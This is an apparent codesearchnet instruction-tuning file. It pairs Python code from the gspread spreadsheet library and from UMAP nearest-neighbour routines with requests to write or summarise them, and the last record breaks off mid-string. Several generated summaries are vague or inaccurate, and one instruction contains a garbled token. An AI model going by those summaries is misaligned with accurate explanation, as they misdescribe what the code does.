{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nrenames the worksheet. :param title: A new title. :type title: str", "response": "def update_title(self, title):\n        \"\"\"Renames the worksheet.\n\n        :param title: A new title.\n        :type title: str\n\n        \"\"\"\n\n        body = {\n            'requests': [{\n                'updateSheetProperties': {\n                    'properties': {\n                        'sheetId': self.id,\n                        'title': title\n                    },\n                    'fields': 'title'\n                }\n            }]\n        }\n\n        response = self.spreadsheet.batch_update(body)\n        self._properties['title'] = title\n        return response"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef append_row(self, values, value_input_option='RAW'):\n        params = {\n            'valueInputOption': value_input_option\n        }\n\n        body = {\n            'values': [values]\n        }\n\n        return self.spreadsheet.values_append(self.title, params, body)", "response": "Adds a row to the worksheet and populates it with values."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef insert_row(\n        self,\n        values,\n        index=1,\n        value_input_option='RAW'\n    ):\n        \"\"\"Adds a row to the worksheet at the specified index\n        and populates it with values.\n\n        Widens the worksheet if there are more values than columns.\n\n        :param values: List of values for the new row.\n        :param index: (optional) Offset for the newly inserted row.\n        :type index: int\n        :param value_input_option: (optional) Determines how input data should\n                                    be interpreted. See `ValueInputOption`_ in\n                                    the Sheets API.\n        :type value_input_option: str\n\n        .. _ValueInputOption: https://developers.google.com/sheets/api/reference/rest/v4/ValueInputOption\n\n        \"\"\"\n\n        body = {\n            \"requests\": [{\n                \"insertDimension\": {\n                    \"range\": {\n                      \"sheetId\": self.id,\n                      \"dimension\": \"ROWS\",\n                      \"startIndex\": index - 1,\n                      \"endIndex\": index\n                    }\n                }\n            }]\n        }\n\n        self.spreadsheet.batch_update(body)\n\n        range_label = '%s!%s' % (self.title, 'A%s' % index)\n\n        data = self.spreadsheet.values_update(\n            range_label,\n            params={\n                'valueInputOption': value_input_option\n            },\n            body={\n                'values': [values]\n            }\n        )\n\n        return data", "response": "Adds a row to the worksheet at the specified index and populates it with values."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef delete_row(self, index):\n        body = {\n            \"requests\": [{\n                \"deleteDimension\": {\n                    \"range\": {\n                      \"sheetId\": self.id,\n                      \"dimension\": \"ROWS\",\n                      \"startIndex\": index - 1,\n                      \"endIndex\": index\n                    }\n                }\n            }]\n        }\n\n        return self.spreadsheet.batch_update(body)", "response": "Deletes the row from the worksheet at the specified index."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef find(self, query):\n        try:\n            return self._finder(finditem, query)\n        except StopIteration:\n            raise CellNotFound(query)", "response": "Finds the first cell matching the query."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef duplicate(\n        self,\n        insert_sheet_index=None,\n        new_sheet_id=None,\n        new_sheet_name=None\n    ):\n        \"\"\"Duplicate the sheet.\n\n        :param int insert_sheet_index: (optional) The zero-based index\n                                       where the new sheet should be inserted.\n                                       The index of all sheets after this are\n                                       incremented.\n        :param int new_sheet_id: (optional) The ID of the new sheet.\n                                 If not set, an ID is chosen. If set, the ID\n                                 must not conflict with any existing sheet ID.\n                                 If set, it must be non-negative.\n        :param str new_sheet_name: (optional) The name of the new sheet.\n                                   If empty, a new name is chosen for you.\n\n        :returns: a newly created :class:`<gspread.models.Worksheet>`.\n\n        .. versionadded:: 3.1.0\n\n        \"\"\"\n        return self.spreadsheet.duplicate_sheet(\n            self.id,\n            insert_sheet_index,\n            new_sheet_id,\n            new_sheet_name\n        )", "response": "Duplicate the current entry in the current worksheet."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef numericise(value, empty2zero=False, default_blank=\"\", allow_underscores_in_numeric_literals=False):\n    if value is not None:\n        if \"_\" in value and not allow_underscores_in_numeric_literals:\n            return value\n        try:\n            value = int(value)\n        except ValueError:\n            try:\n                value = float(value)\n            except ValueError:\n                if value == \"\":\n                    if empty2zero:\n                        value = 0\n                    else:\n                        value = default_blank\n\n    return value", "response": "Returns a value that depends on the input string."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nreturn a list of numericised values from strings", "response": "def numericise_all(input, empty2zero=False, default_blank=\"\", allow_underscores_in_numeric_literals=False):\n    \"\"\"Returns a list of numericised values from strings\"\"\"\n    return [numericise(s, empty2zero, default_blank, allow_underscores_in_numeric_literals) for s in input]"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef rowcol_to_a1(row, col):\n    row = int(row)\n    col = int(col)\n\n    if row < 1 or col < 1:\n        raise IncorrectCellLabel('(%s, %s)' % (row, col))\n\n    div = col\n    column_label = ''\n\n    while div:\n        (div, mod) = divmod(div, 26)\n        if mod == 0:\n            mod = 26\n            div -= 1\n        column_label = chr(mod + MAGIC_NUMBER) + column_label\n\n    label = '%s%s' % (column_label, row)\n\n    return label", "response": "Translates a row and column cell address to A1 notation."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\ntranslating a cell s address in A1 notation to a tuple of integers.", "response": "def a1_to_rowcol(label):\n    \"\"\"Translates a cell's address in A1 notation to a tuple of integers.\n\n    :param label: A cell label in A1 notation, e.g. 'B1'.\n                  Letter case is ignored.\n    :type label: str\n\n    :returns: a tuple containing `row` and `column` numbers. Both indexed\n              from 1 (one).\n\n    Example:\n\n    >>> a1_to_rowcol('A1')\n    (1, 1)\n\n    \"\"\"\n    m = CELL_ADDR_RE.match(label)\n    if m:\n        column_label = m.group(1).upper()\n        row = int(m.group(2))\n\n        col = 0\n        for i, c in enumerate(reversed(column_label)):\n            col += (ord(c) - MAGIC_NUMBER) * (26 ** i)\n    else:\n        raise IncorrectCellLabel(label)\n\n    return (row, col)"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef cast_to_a1_notation(method):\n    @wraps(method)\n    def wrapper(self, *args, **kwargs):\n        try:\n            if len(args):\n                int(args[0])\n\n            # Convert to A1 notation\n            range_start = rowcol_to_a1(*args[:2])\n            range_end = rowcol_to_a1(*args[-2:])\n            range_name = ':'.join((range_start, range_end))\n\n            args = (range_name,) + args[4:]\n        except ValueError:\n            pass\n\n        return method(self, *args, **kwargs)\n\n    return wrapper", "response": "Decorator function casts wrapped arguments to A1 notation\n            in range method calls."}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ncalculates gid of a worksheet from its wid.", "response": "def wid_to_gid(wid):\n    \"\"\"Calculate gid of a worksheet from its wid.\"\"\"\n    widval = wid[1:] if len(wid) > 3 else wid\n    xorval = 474 if len(wid) > 3 else 31578\n    return str(int(widval, 36) ^ xorval)"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef open(self, title):\n        try:\n            properties = finditem(\n                lambda x: x['name'] == title,\n                self.list_spreadsheet_files()\n            )\n\n            # Drive uses different terminology\n            properties['title'] = properties['name']\n\n            return Spreadsheet(self, properties)\n        except StopIteration:\n            raise SpreadsheetNotFound", "response": "Opens a spreadsheet with the specified title."}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nopen all available spreadsheets.", "response": "def openall(self, title=None):\n        \"\"\"Opens all available spreadsheets.\n\n        :param title: (optional) If specified can be used to filter\n                      spreadsheets by title.\n        :type title: str\n\n        :returns: a list of :class:`~gspread.models.Spreadsheet` instances.\n\n        \"\"\"\n        spreadsheet_files = self.list_spreadsheet_files()\n\n        return [\n            Spreadsheet(self, dict(title=x['name'], **x))\n            for x in spreadsheet_files\n        ]"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a new spreadsheet.", "response": "def create(self, title):\n        \"\"\"Creates a new spreadsheet.\n\n        :param title: A title of a new spreadsheet.\n        :type title: str\n\n        :returns: a :class:`~gspread.models.Spreadsheet` instance.\n\n        .. note::\n\n           In order to use this method, you need to add\n           ``https://www.googleapis.com/auth/drive`` to your oAuth scope.\n\n           Example::\n\n              scope = [\n                  'https://spreadsheets.google.com/feeds',\n                  'https://www.googleapis.com/auth/drive'\n              ]\n\n           Otherwise you will get an ``Insufficient Permission`` error\n           when you try to create a new spreadsheet.\n\n        \"\"\"\n        payload = {\n            'title': title,\n            'mimeType': 'application/vnd.google-apps.spreadsheet'\n        }\n        r = self.request(\n            'post',\n            DRIVE_FILES_API_V2_URL,\n            json=payload\n        )\n        spreadsheet_id = r.json()['id']\n        return self.open_by_key(spreadsheet_id)"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef copy(self, file_id, title=None, copy_permissions=False):\n        url = '{0}/{1}/copy'.format(\n            DRIVE_FILES_API_V2_URL,\n            file_id\n        )\n\n        payload = {\n            'title': title,\n            'mimeType': 'application/vnd.google-apps.spreadsheet'\n        }\n        r = self.request(\n            'post',\n            url,\n            json=payload\n        )\n        spreadsheet_id = r.json()['id']\n\n        new_spreadsheet = self.open_by_key(spreadsheet_id)\n\n        if copy_permissions:\n            original = self.open_by_key(file_id)\n\n            permissions = original.list_permissions()\n            for p in permissions:\n                if p.get('deleted'):\n                    continue\n                try:\n                    new_spreadsheet.share(\n                        value=p['emailAddress'],\n                        perm_type=p['type'],\n                        role=p['role'],\n                        notify=False\n                    )\n                except Exception:\n                    pass\n\n        return new_spreadsheet", "response": "Copies a spreadsheet.\n\n        :param file_id: A key of a spreadsheet to copy.\n        :type title: str\n\n        :param title: (optional) A title for the new spreadsheet.\n        :type title: str\n\n        :param copy_permissions: (optional) If True, copy permissions from\n               original spreadsheet to new spreadsheet.\n        :type copy_permissions: bool\n\n\n        :returns: a :class:`~gspread.models.Spreadsheet` instance.\n\n        .. versionadded:: 3.1.0\n\n        .. note::\n\n           In order to use this method, you need to add\n           ``https://www.googleapis.com/auth/drive`` to your oAuth scope.\n\n           Example::\n\n              scope = [\n                  'https://spreadsheets.google.com/feeds',\n                  'https://www.googleapis.com/auth/drive'\n              ]\n\n           Otherwise you will get an ``Insufficient Permission`` error\n           when you try to copy a spreadsheet."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef del_spreadsheet(self, file_id):\n        url = '{0}/{1}'.format(\n            DRIVE_FILES_API_V2_URL,\n            file_id\n        )\n\n        self.request('delete', url)", "response": "Deletes a single spreadsheet."}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef import_csv(self, file_id, data):\n        headers = {'Content-Type': 'text/csv'}\n        url = '{0}/{1}'.format(DRIVE_FILES_UPLOAD_API_V2_URL, file_id)\n\n        self.request(\n            'put',\n            url,\n            data=data,\n            params={\n                'uploadType': 'media',\n                'convert': True\n            },\n            headers=headers\n        )", "response": "Imports data into the first page of the spreadsheet."}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef list_permissions(self, file_id):\n        url = '{0}/{1}/permissions'.format(DRIVE_FILES_API_V2_URL, file_id)\n\n        r = self.request('get', url)\n\n        return r.json()['items']", "response": "Retrieve a list of permissions for a file."}
{"SOURCE": "codesearchnet", "instruction": "How would you code a function in Python 3 to\ninsert a permission for a file.", "response": "def insert_permission(\n        self,\n        file_id,\n        value,\n        perm_type,\n        role,\n        notify=True,\n        email_message=None,\n        with_link=False\n    ):\n        \"\"\"Creates a new permission for a file.\n\n        :param file_id: a spreadsheet ID (aka file ID.)\n        :type file_id: str\n        :param value: user or group e-mail address, domain name\n                      or None for 'default' type.\n        :type value: str, None\n        :param perm_type: (optional) The account type.\n               Allowed values are: ``user``, ``group``, ``domain``,\n               ``anyone``\n        :type perm_type: str\n        :param role: (optional) The primary role for this user.\n               Allowed values are: ``owner``, ``writer``, ``reader``\n        :type str:\n\n        :param notify: (optional) Whether to send an email to the target user/domain.\n        :type notify: str\n        :param email_message: (optional) An email message to be sent if notify=True.\n        :type email_message: str\n        \n        :param with_link: (optional) Whether the link is required for this permission to be active.\n        :type with_link: bool\n\n        Examples::\n\n            # Give write permissions to otto@example.com\n\n            gc.insert_permission(\n                '0BmgG6nO_6dprnRRUWl1UFE',\n                'otto@example.org',\n                perm_type='user',\n                role='writer'\n            )\n\n            # Make the spreadsheet publicly readable\n\n            gc.insert_permission(\n                '0BmgG6nO_6dprnRRUWl1UFE',\n                None,\n                perm_type='anyone',\n                role='reader'\n            )\n\n        \"\"\"\n\n        url = '{0}/{1}/permissions'.format(DRIVE_FILES_API_V2_URL, file_id)\n\n        payload = {\n            'value': value,\n            'type': perm_type,\n            'role': role,\n            'withLink': with_link\n        }\n\n        params = {\n            'sendNotificationEmails': notify,\n            'emailMessage': email_message\n        }\n\n        self.request(\n            'post',\n            url,\n            json=payload,\n            params=params\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you create a Python 3 function that\ndeletes a permission from a file.", "response": "def remove_permission(self, file_id, permission_id):\n        \"\"\"Deletes a permission from a file.\n\n        :param file_id: a spreadsheet ID (aka file ID.)\n        :type file_id: str\n        :param permission_id: an ID for the permission.\n        :type permission_id: str\n        \"\"\"\n        url = '{0}/{1}/permissions/{2}'.format(\n            DRIVE_FILES_API_V2_URL,\n            file_id,\n            permission_id\n        )\n\n        self.request('delete', url)"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef tau_rand_int(state):\n    state[0] = (((state[0] & 4294967294) << 12) & 0xffffffff) ^ (\n        (((state[0] << 13) & 0xffffffff) ^ state[0]) >> 19\n    )\n    state[1] = (((state[1] & 4294967288) << 4) & 0xffffffff) ^ (\n        (((state[1] << 2) & 0xffffffff) ^ state[1]) >> 25\n    )\n    state[2] = (((state[2] & 4294967280) << 17) & 0xffffffff) ^ (\n        (((state[2] << 3) & 0xffffffff) ^ state[2]) >> 11\n    )\n\n    return state[0] ^ state[1] ^ state[2]", "response": "A fast ( pseudo - ) random number generator."}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ncomputes the standard l2 norm of a vector.", "response": "def norm(vec):\n    \"\"\"Compute the (standard l2) norm of a vector.\n\n    Parameters\n    ----------\n    vec: array of shape (dim,)\n\n    Returns\n    -------\n    The l2 norm of vec.\n    \"\"\"\n    result = 0.0\n    for i in range(vec.shape[0]):\n        result += vec[i] ** 2\n    return np.sqrt(result)"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ngenerates n_samples many integers from 0 to pool_size such that no noCOOKIE integer is selected twice.", "response": "def rejection_sample(n_samples, pool_size, rng_state):\n    \"\"\"Generate n_samples many integers from 0 to pool_size such that no\n    integer is selected twice. The duplication constraint is achieved via\n    rejection sampling.\n\n    Parameters\n    ----------\n    n_samples: int\n        The number of random samples to select from the pool\n\n    pool_size: int\n        The size of the total pool of candidates to sample from\n\n    rng_state: array of int64, shape (3,)\n        Internal state of the random number generator\n\n    Returns\n    -------\n    sample: array of shape(n_samples,)\n        The ``n_samples`` randomly selected elements from the pool.\n    \"\"\"\n    result = np.empty(n_samples, dtype=np.int64)\n    for i in range(n_samples):\n        reject_sample = True\n        while reject_sample:\n            j = tau_rand_int(rng_state) % pool_size\n            for k in range(i):\n                if j == result[k]:\n                    break\n            else:\n                reject_sample = False\n        result[i] = j\n    return result"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef make_heap(n_points, size):\n    result = np.zeros((3, int(n_points), int(size)), dtype=np.float64)\n    result[0] = -1\n    result[1] = np.infty\n    result[2] = 0\n\n    return result", "response": "This is a helper function that creates a numba enabled heap object."}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nrestore the heap property for a heap with an out of place element at position elt. This works with a heap pair where heap1 carries the weights and heap2 holds the corresponding elements.", "response": "def siftdown(heap1, heap2, elt):\n    \"\"\"Restore the heap property for a heap with an out of place element\n    at position ``elt``. This works with a heap pair where heap1 carries\n    the weights and heap2 holds the corresponding elements.\"\"\"\n    while elt * 2 + 1 < heap1.shape[0]:\n        left_child = elt * 2 + 1\n        right_child = left_child + 1\n        swap = elt\n\n        if heap1[swap] < heap1[left_child]:\n            swap = left_child\n\n        if right_child < heap1.shape[0] and heap1[swap] < heap1[right_child]:\n            swap = right_child\n\n        if swap == elt:\n            break\n        else:\n            heap1[elt], heap1[swap] = heap1[swap], heap1[elt]\n            heap2[elt], heap2[swap] = heap2[swap], heap2[elt]\n            elt = swap"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef deheap_sort(heap):\n    indices = heap[0]\n    weights = heap[1]\n\n    for i in range(indices.shape[0]):\n\n        ind_heap = indices[i]\n        dist_heap = weights[i]\n\n        for j in range(ind_heap.shape[0] - 1):\n            ind_heap[0], ind_heap[ind_heap.shape[0] - j - 1] = (\n                ind_heap[ind_heap.shape[0] - j - 1],\n                ind_heap[0],\n            )\n            dist_heap[0], dist_heap[dist_heap.shape[0] - j - 1] = (\n                dist_heap[dist_heap.shape[0] - j - 1],\n                dist_heap[0],\n            )\n\n            siftdown(\n                dist_heap[: dist_heap.shape[0] - j - 1],\n                ind_heap[: ind_heap.shape[0] - j - 1],\n                0,\n            )\n\n    return indices.astype(np.int64), weights", "response": "This function takes an array of heaps of indices and weights and sorts them into a single list of indices and weights."}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\nsearching the heap for the smallest flagged element that is in the row.", "response": "def smallest_flagged(heap, row):\n    \"\"\"Search the heap for the smallest element that is\n    still flagged.\n\n    Parameters\n    ----------\n    heap: array of shape (3, n_samples, n_neighbors)\n        The heaps to search\n\n    row: int\n        Which of the heaps to search\n\n    Returns\n    -------\n    index: int\n        The index of the smallest flagged element\n        of the ``row``th heap, or -1 if no flagged\n        elements remain in the heap.\n    \"\"\"\n    ind = heap[0, row]\n    dist = heap[1, row]\n    flag = heap[2, row]\n\n    min_dist = np.inf\n    result_index = -1\n\n    for i in range(ind.shape[0]):\n        if flag[i] == 1 and dist[i] < min_dist:\n            min_dist = dist[i]\n            result_index = i\n\n    if result_index >= 0:\n        flag[result_index] = 0.0\n        return int(ind[result_index])\n    else:\n        return -1"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild a heap of candidate neighbors for nearest neighbor descent.", "response": "def build_candidates(current_graph, n_vertices, n_neighbors, max_candidates, rng_state):\n    \"\"\"Build a heap of candidate neighbors for nearest neighbor descent. For\n    each vertex the candidate neighbors are any current neighbors, and any\n    vertices that have the vertex as one of their nearest neighbors.\n\n    Parameters\n    ----------\n    current_graph: heap\n        The current state of the graph for nearest neighbor descent.\n\n    n_vertices: int\n        The total number of vertices in the graph.\n\n    n_neighbors: int\n        The number of neighbor edges per node in the current graph.\n\n    max_candidates: int\n        The maximum number of new candidate neighbors.\n\n    rng_state: array of int64, shape (3,)\n        The internal state of the rng\n\n    Returns\n    -------\n    candidate_neighbors: A heap with an array of (randomly sorted) candidate\n    neighbors for each vertex in the graph.\n    \"\"\"\n    candidate_neighbors = make_heap(n_vertices, max_candidates)\n    for i in range(n_vertices):\n        for j in range(n_neighbors):\n            if current_graph[0, i, j] < 0:\n                continue\n            idx = current_graph[0, i, j]\n            isn = current_graph[2, i, j]\n            d = tau_rand(rng_state)\n            heap_push(candidate_neighbors, i, d, idx, isn)\n            heap_push(candidate_neighbors, idx, d, i, isn)\n            current_graph[2, i, j] = 0\n\n    return candidate_neighbors"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild a heap of candidate neighbors for nearest neighbor descent.", "response": "def new_build_candidates(\n    current_graph, n_vertices, n_neighbors, max_candidates, rng_state, rho=0.5\n):  # pragma: no cover\n    \"\"\"Build a heap of candidate neighbors for nearest neighbor descent. For\n    each vertex the candidate neighbors are any current neighbors, and any\n    vertices that have the vertex as one of their nearest neighbors.\n\n    Parameters\n    ----------\n    current_graph: heap\n        The current state of the graph for nearest neighbor descent.\n\n    n_vertices: int\n        The total number of vertices in the graph.\n\n    n_neighbors: int\n        The number of neighbor edges per node in the current graph.\n\n    max_candidates: int\n        The maximum number of new candidate neighbors.\n\n    rng_state: array of int64, shape (3,)\n        The internal state of the rng\n\n    Returns\n    -------\n    candidate_neighbors: A heap with an array of (randomly sorted) candidate\n    neighbors for each vertex in the graph.\n    \"\"\"\n    new_candidate_neighbors = make_heap(n_vertices, max_candidates)\n    old_candidate_neighbors = make_heap(n_vertices, max_candidates)\n\n    for i in numba.prange(n_vertices):\n        for j in range(n_neighbors):\n            if current_graph[0, i, j] < 0:\n                continue\n            idx = current_graph[0, i, j]\n            isn = current_graph[2, i, j]\n            d = tau_rand(rng_state)\n            if tau_rand(rng_state) < rho:\n                c = 0\n                if isn:\n                    c += heap_push(new_candidate_neighbors, i, d, idx, isn)\n                    c += heap_push(new_candidate_neighbors, idx, d, i, isn)\n                else:\n                    heap_push(old_candidate_neighbors, i, d, idx, isn)\n                    heap_push(old_candidate_neighbors, idx, d, i, isn)\n\n                if c > 0:\n                    current_graph[2, i, j] = 0\n\n    return new_candidate_neighbors, old_candidate_neighbors"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef submatrix(dmat, indices_col, n_neighbors):\n    n_samples_transform, n_samples_fit = dmat.shape\n    submat = np.zeros((n_samples_transform, n_neighbors), dtype=dmat.dtype)\n    for i in numba.prange(n_samples_transform):\n        for j in numba.prange(n_neighbors):\n            submat[i, j] = dmat[i, indices_col[i, j]]\n    return submat", "response": "Return a submatrix given an orginal matrix and the indices to keep."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef standardised_euclidean(x, y, sigma=_mock_ones):\n    result = 0.0\n    for i in range(x.shape[0]):\n        result += ((x[i] - y[i]) ** 2) / sigma[i]\n\n    return np.sqrt(result)", "response": "Euclidean distance standardised against a vector of standardised deviations per coordinate."}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef manhattan(x, y):\n    result = 0.0\n    for i in range(x.shape[0]):\n        result += np.abs(x[i] - y[i])\n\n    return result", "response": "Manhatten taxicab or l1 distance."}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef chebyshev(x, y):\n    result = 0.0\n    for i in range(x.shape[0]):\n        result = max(result, np.abs(x[i] - y[i]))\n\n    return result", "response": "Chebyshev or l - infinity distance."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\ncreates a numba accelerated version of nearest neighbor descent for a given distance metric and metric arguments.", "response": "def make_nn_descent(dist, dist_args):\n    \"\"\"Create a numba accelerated version of nearest neighbor descent\n    specialised for the given distance metric and metric arguments. Numba\n    doesn't support higher order functions directly, but we can instead JIT\n    compile the version of NN-descent for any given metric.\n\n    Parameters\n    ----------\n    dist: function\n        A numba JITd distance function which, given two arrays computes a\n        dissimilarity between them.\n\n    dist_args: tuple\n        Any extra arguments that need to be passed to the distance function\n        beyond the two arrays to be compared.\n\n    Returns\n    -------\n    A numba JITd function for nearest neighbor descent computation that is\n    specialised to the given metric.\n    \"\"\"\n\n    @numba.njit(parallel=True)\n    def nn_descent(\n        data,\n        n_neighbors,\n        rng_state,\n        max_candidates=50,\n        n_iters=10,\n        delta=0.001,\n        rho=0.5,\n        rp_tree_init=True,\n        leaf_array=None,\n        verbose=False,\n    ):\n        n_vertices = data.shape[0]\n\n        current_graph = make_heap(data.shape[0], n_neighbors)\n        for i in range(data.shape[0]):\n            indices = rejection_sample(n_neighbors, data.shape[0], rng_state)\n            for j in range(indices.shape[0]):\n                d = dist(data[i], data[indices[j]], *dist_args)\n                heap_push(current_graph, i, d, indices[j], 1)\n                heap_push(current_graph, indices[j], d, i, 1)\n\n        if rp_tree_init:\n            for n in range(leaf_array.shape[0]):\n                for i in range(leaf_array.shape[1]):\n                    if leaf_array[n, i] < 0:\n                        break\n                    for j in range(i + 1, leaf_array.shape[1]):\n                        if leaf_array[n, j] < 0:\n                            break\n                        d = dist(\n                            data[leaf_array[n, i]], data[leaf_array[n, j]], *dist_args\n                        )\n                        heap_push(\n                            current_graph, leaf_array[n, i], d, leaf_array[n, j], 1\n                        )\n                        heap_push(\n                            current_graph, leaf_array[n, j], d, leaf_array[n, i], 1\n                        )\n\n        for n in range(n_iters):\n            if verbose:\n                print(\"\\t\", n, \" / \", n_iters)\n\n            candidate_neighbors = build_candidates(\n                current_graph, n_vertices, n_neighbors, max_candidates, rng_state\n            )\n\n            c = 0\n            for i in range(n_vertices):\n                for j in range(max_candidates):\n                    p = int(candidate_neighbors[0, i, j])\n                    if p < 0 or tau_rand(rng_state) < rho:\n                        continue\n                    for k in range(max_candidates):\n                        q = int(candidate_neighbors[0, i, k])\n                        if (\n                            q < 0\n                            or not candidate_neighbors[2, i, j]\n                            and not candidate_neighbors[2, i, k]\n                        ):\n                            continue\n\n                        d = dist(data[p], data[q], *dist_args)\n                        c += heap_push(current_graph, p, d, q, 1)\n                        c += heap_push(current_graph, q, d, p, 1)\n\n            if c <= delta * n_neighbors * data.shape[0]:\n                break\n\n        return deheap_sort(current_graph)\n\n    return nn_descent"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef component_layout(\n    data, n_components, component_labels, dim, metric=\"euclidean\", metric_kwds={}\n):\n    \"\"\"Provide a layout relating the separate connected components. This is done\n    by taking the centroid of each component and then performing a spectral embedding\n    of the centroids.\n\n    Parameters\n    ----------\n    data: array of shape (n_samples, n_features)\n        The source data -- required so we can generate centroids for each\n        connected component of the graph.\n\n    n_components: int\n        The number of distinct components to be layed out.\n\n    component_labels: array of shape (n_samples)\n        For each vertex in the graph the label of the component to\n        which the vertex belongs.\n\n    dim: int\n        The chosen embedding dimension.\n\n    metric: string or callable (optional, default 'euclidean')\n        The metric used to measure distances among the source data points.\n\n    metric_kwds: dict (optional, default {})\n        Keyword arguments to be passed to the metric function.\n\n    Returns\n    -------\n    component_embedding: array of shape (n_components, dim)\n        The ``dim``-dimensional embedding of the ``n_components``-many\n        connected components.\n    \"\"\"\n\n    component_centroids = np.empty((n_components, data.shape[1]), dtype=np.float64)\n\n    for label in range(n_components):\n        component_centroids[label] = data[component_labels == label].mean(axis=0)\n\n    distance_matrix = pairwise_distances(\n        component_centroids, metric=metric, **metric_kwds\n    )\n    affinity_matrix = np.exp(-distance_matrix ** 2)\n\n    component_embedding = SpectralEmbedding(\n        n_components=dim, affinity=\"precomputed\"\n    ).fit_transform(affinity_matrix)\n    component_embedding /= component_embedding.max()\n\n    return component_embedding", "response": "This function takes a set of data points and returns a spectral embedding of the components."}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef multi_component_layout(\n    data,\n    graph,\n    n_components,\n    component_labels,\n    dim,\n    random_state,\n    metric=\"euclidean\",\n    metric_kwds={},\n):\n    \"\"\"Specialised layout algorithm for dealing with graphs with many connected components.\n    This will first fid relative positions for the components by spectrally embedding\n    their centroids, then spectrally embed each individual connected component positioning\n    them according to the centroid embeddings. This provides a decent embedding of each\n    component while placing the components in good relative positions to one another.\n\n    Parameters\n    ----------\n    data: array of shape (n_samples, n_features)\n        The source data -- required so we can generate centroids for each\n        connected component of the graph.\n\n    graph: sparse matrix\n        The adjacency matrix of the graph to be emebdded.\n\n    n_components: int\n        The number of distinct components to be layed out.\n\n    component_labels: array of shape (n_samples)\n        For each vertex in the graph the label of the component to\n        which the vertex belongs.\n\n    dim: int\n        The chosen embedding dimension.\n\n    metric: string or callable (optional, default 'euclidean')\n        The metric used to measure distances among the source data points.\n\n    metric_kwds: dict (optional, default {})\n        Keyword arguments to be passed to the metric function.\n\n\n    Returns\n    -------\n    embedding: array of shape (n_samples, dim)\n        The initial embedding of ``graph``.\n    \"\"\"\n\n    result = np.empty((graph.shape[0], dim), dtype=np.float32)\n\n    if n_components > 2 * dim:\n        meta_embedding = component_layout(\n            data,\n            n_components,\n            component_labels,\n            dim,\n            metric=metric,\n            metric_kwds=metric_kwds,\n        )\n    else:\n        k = int(np.ceil(n_components / 2.0))\n        base = np.hstack([np.eye(k), np.zeros((k, dim - k))])\n        meta_embedding = np.vstack([base, -base])[:n_components]\n\n    for label in range(n_components):\n        component_graph = graph.tocsr()[component_labels == label, :].tocsc()\n        component_graph = component_graph[:, component_labels == label].tocoo()\n\n        distances = pairwise_distances([meta_embedding[label]], meta_embedding)\n        data_range = distances[distances > 0.0].min() / 2.0\n\n        if component_graph.shape[0] < 2 * dim:\n            result[component_labels == label] = (\n                random_state.uniform(\n                    low=-data_range,\n                    high=data_range,\n                    size=(component_graph.shape[0], dim),\n                )\n                + meta_embedding[label]\n            )\n            continue\n\n        diag_data = np.asarray(component_graph.sum(axis=0))\n        # standard Laplacian\n        # D = scipy.sparse.spdiags(diag_data, 0, graph.shape[0], graph.shape[0])\n        # L = D - graph\n        # Normalized Laplacian\n        I = scipy.sparse.identity(component_graph.shape[0], dtype=np.float64)\n        D = scipy.sparse.spdiags(\n            1.0 / np.sqrt(diag_data),\n            0,\n            component_graph.shape[0],\n            component_graph.shape[0],\n        )\n        L = I - D * component_graph * D\n\n        k = dim + 1\n        num_lanczos_vectors = max(2 * k + 1, int(np.sqrt(component_graph.shape[0])))\n        try:\n            eigenvalues, eigenvectors = scipy.sparse.linalg.eigsh(\n                L,\n                k,\n                which=\"SM\",\n                ncv=num_lanczos_vectors,\n                tol=1e-4,\n                v0=np.ones(L.shape[0]),\n                maxiter=graph.shape[0] * 5,\n            )\n            order = np.argsort(eigenvalues)[1:k]\n            component_embedding = eigenvectors[:, order]\n            expansion = data_range / np.max(np.abs(component_embedding))\n            component_embedding *= expansion\n            result[component_labels == label] = (\n                component_embedding + meta_embedding[label]\n            )\n        except scipy.sparse.linalg.ArpackError:\n            warn(\n                \"WARNING: spectral initialisation failed! The 